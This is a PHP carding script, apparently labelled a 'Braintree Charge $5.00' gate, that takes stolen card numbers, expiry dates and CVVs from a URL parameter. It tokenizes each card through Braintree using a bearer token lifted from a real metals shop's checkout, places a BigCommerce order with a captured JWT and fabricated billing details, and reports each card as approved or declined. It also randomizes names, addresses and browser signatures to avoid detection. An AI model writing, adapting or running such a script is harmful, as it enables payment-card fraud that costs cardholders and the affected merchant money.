<?php

ob_start();

$Gate = 'Braintree Charge $5.00';
$lista = $_GET['lista'];
preg_match_all("/([\d]+\d)/", $lista, $list);
$cc = $list[0][0];
$mes = $list[0][1];
$ano = $list[0][2];
$cvv = $list[0][3];

error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

if (file_exists(getcwd().'/cookie.txt')) {
    @unlink('cookie.txt');
}
header('Content-Type: application/json; charset=utf-8');
function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  return explode($end, $str[1])[0];
}

function Gen_Randi_U_A()
{
  $platforms = ['Windows NT', 'Macintosh', 'Linux', 'Android', 'iOS'];
  $browsers = ['Mozilla', 'Chrome', 'Opera', 'Safari', 'Edge', 'Firefox'];
  $platform = $platforms[array_rand($platforms)];
  $version = rand(11, 99) . '.' . rand(11, 99);
  $browser = $browsers[array_rand($browsers)];
  $chromeVersion = rand(11, 99) . '.0.' . rand(1111, 9999) . '.' . rand(111, 999);
  return "$browser/5.0 ($platform " . rand(11, 99) . ".0; Win64; x64) AppleWebKit/$version (KHTML, like Gecko) $browser/$version.$chromeVersion Safari/$version." . rand(11, 99);
}

$lista = $_GET['lista'];

$names = ['Ashish', 'John', 'Emily', 'Michael', 'Olivia', 'Daniel', 'Sophia', 'Matthew', 'Ava', 'William'];
$last_names = ['Mishra', 'Smith', 'Johnson', 'Brown', 'Williams', 'Jones', 'Miller', 'Davis', 'Garcia', 'Rodriguez', 'Martinez'];
$company_Names = ['BinBhaiFamily', 'TechSolutions', 'InnovateHub', 'EpicTech', 'CodeMasters', 'WebWizards', 'DataGenius', 'SmartTech', 'QuantumSystems', 'DigitalCrafters'];
$streets = ['Main St', 'Oak St', 'Maple Ave', 'Pine St', 'Cedar Ln', 'Elm St', 'Springfield Dr', 'Highland Ave', 'Meadow Ln', 'Sunset Blvd'];
$cities = ['New York', 'Los Angeles', 'Chicago', 'Houston', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'San Jose'];
$phones = ['682', '346', '246'];
$state_data = [
    'NY' => 'New York',
    'CA' => 'California',
    'TX' => 'Texas',
    'FL' => 'Florida',
    'PA' => 'Pennsylvania',
    'IL' => 'Illinois',
    'OH' => 'Ohio',
    'GA' => 'Georgia',
    'NC' => 'North Carolina',
    'MI' => 'Michigan'
];
$zips = [
    'NY' => '10001',
    'CA' => '90001',
    'TX' => '75001',
    'FL' => '33101',
    'PA' => '19101',
    'IL' => '60601',
    'OH' => '44101',
    'GA' => '30301',
    'NC' => '28201',
    'MI' => '48201'
];

$name = ucfirst($names[array_rand($names)]);
$last = ucfirst($last_names[array_rand($last_names)]);
$com = ucfirst($company_Names[array_rand($company_Names)]);
$street = rand(100, 9999) . ' ' . $streets[array_rand($streets)];
$city = $cities[array_rand($cities)];
$state_code = array_rand($state_data);
$state = $state_data[$state_code];
$zip = $zips[$state_code];
$phone = $phones[array_rand($phones)] . rand(1000000, 9999999);
$mail = strtolower($name) . '.' . strtolower($last) . rand(0000, 9999) . '@gmail.com';



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.braintree-api.com/graphql');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: payments.braintree-api.com',
    'accept: */*',
    'accept-language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization: Bearer eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NjczMjg4NzMsImp0aSI6IjcxNmQ3ZDFhLTUyMDgtNDkzNy04YTdkLWY0OGYzZDg0NWI4OCIsInN1YiI6Imh4ZGNmcDVoeWZmNmgzNzYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Imh4ZGNmcDVoeWZmNmgzNzYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJhdWQiOlsicm90b21ldGFscy5jb20iLCJ3d3cucm90b21ldGFscy5jb20iXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0IiwiQnJhaW50cmVlOkNsaWVudFNESyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJyb3RvbWV0YWxzaW5jX2luc3RhbnQiLCJwYXlwYWxfY2xpZW50X2lkIjoiQVZQVDYwNHV6VjEtM0o1MHNvUzVfYUtOWHliaDdmZEtCUHJFZk12QlJMS2MtbkxETjlINTI1bXF4cHFaSmd1R2pMUUREc0J1bW14UU9Bc1QifX0.MVV27c5bHYy-6PJ1Oo7S4uKqwuNPlpqXdaezIi5CwlzolgABxZYATBQ336jwTGOHjFXot4ZWldW8NDUhUTMdHA',
    'braintree-version: 2018-05-10',
    'content-type: application/json',
    'origin: https://assets.braintreegateway.com',
    'referer: https://assets.braintreegateway.com/',
    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: cross-site',
    'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
   // 'accept-encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"93c00f25-6747-4245-8000-e474c69c9b95"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'","cardholderName":"james Kirkup","billingAddress":{"countryName":"United States","postalCode":"10080","streetAddress":"Street 108"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');

$r1 = curl_exec($ch);
curl_close($ch);

$token = trim(strip_tags(getStr($r1,'"token":"','"')));

//cho $token;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://payments.bigcommerce.com/api/public/v1/orders/payments');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: application/json',
    'Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'Authorization: JWT eyJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3NjcyNDgyOTMsIm5iZiI6MTc2NzI0NDY5MywiaXNzIjoicGF5bWVudHMuYmlnY29tbWVyY2UuY29tIiwic3ViIjoxMDA2NTI4LCJqdGkiOiJiOWY5NjdmZS02NThlLTQ4ZGUtOTdiZC0wYjA5NzlhZDU5NDgiLCJpYXQiOjE3NjcyNDQ2OTMsImRhdGEiOnsic3RvcmVfaWQiOiIxMDA2NTI4Iiwib3JkZXJfaWQiOiIxODkxOTQiLCJhbW91bnQiOjU1NzYsImN1cnJlbmN5IjoiVVNEIiwic3RvcmVfdXJsIjoiaHR0cHM6Ly93d3cucm90b21ldGFscy5jb20iLCJmb3JtX2lkIjoidW5rbm93biIsInBheW1lbnRfY29udGV4dCI6ImNoZWNrb3V0IiwicGF5bWVudF90eXBlIjoiZWNvbW1lcmNlIn19.LQfiOMcFg41OwypueDC21-kSdAcY5G7xrH-HLqeGT78',
    'Connection: keep-alive',
    'Content-Type: application/json',
    'Origin: https://www.rotometals.com',
    'Referer: https://www.rotometals.com/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: cross-site',
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua: "Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
   // 'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"customer":{"geo_ip_country_code":"US","session_token":"a0d9ef74fa622b6671c9be8164dc44b5ec72d111"},"notify_url":"https://internalapi-1006528.mybigcommerce.com/internalapi/v1/checkout/order/189194/payment","order":{"billing_address":{"city":"New York","company":"Oxygen","country_code":"US","country":"United States","first_name":"Fazil","last_name":"Aggayz","phone":"0665618205","state_code":"NY","state":"New York","street_1":"Street 108","zip":"10080","email":"Binbhai000@gmail.com"},"coupons":[],"currency":"USD","id":"189194","items":[{"code":"90218d08-7f52-42f2-9691-e0e63ee98961","variant_id":1029,"name":"Antimony Shot ~1 Pound 99.6% Minimum Pure","price":4499,"unit_price":4499,"quantity":1,"sku":"ANTIMONYshotnew"}],"shipping":[{"method":"Flat rate <12\\" items 7-18 days (7-18 days)"}],"shipping_address":{"city":"New York","company":"Oxygen","country_code":"US","country":"United States","first_name":"Fazil","last_name":"Aggayz","phone":"0665618205","state_code":"NY","state":"New York","street_1":"Street 108","zip":"10080"},"token":"ecfcbc28ddd43df523b2072497b76c58","totals":{"grand_total":5576,"handling":0,"shipping":1077,"subtotal":4499,"tax":0}},"payment":{"device_info":"{\\"correlation_id\\":\\"93c00f25-6747-4245-8000-e474c69c\\"}","gateway":"braintree","notify_url":"https://internalapi-1006528.mybigcommerce.com/internalapi/v1/checkout/order/189194/payment","vault_payment_instrument":false,"method":"credit-card","credit_card_token":{"token":"'.$token.'"}},"store":{"hash":"cra054","id":"1006528","name":"RotoMetals"}}');

$r2 = curl_exec($ch);
curl_close($ch);
header('Content-Type: application/json; charset=utf-8');

$msg = getStr($r2, '"errors":[{"code":"','","');

if(strpos($r2, '"result":"success"')){
       $message = "Charged 54$";
    $status  =  "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅";
}elseif(strpos($r2,'"status":"error","')){
    $message = $msg;
    $status  = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌";
}

echo json_encode([
"lista"=>$lista,
"Response"=>$message,
"Credits"=>$credits,
"Status"=>$status,
],128|256);


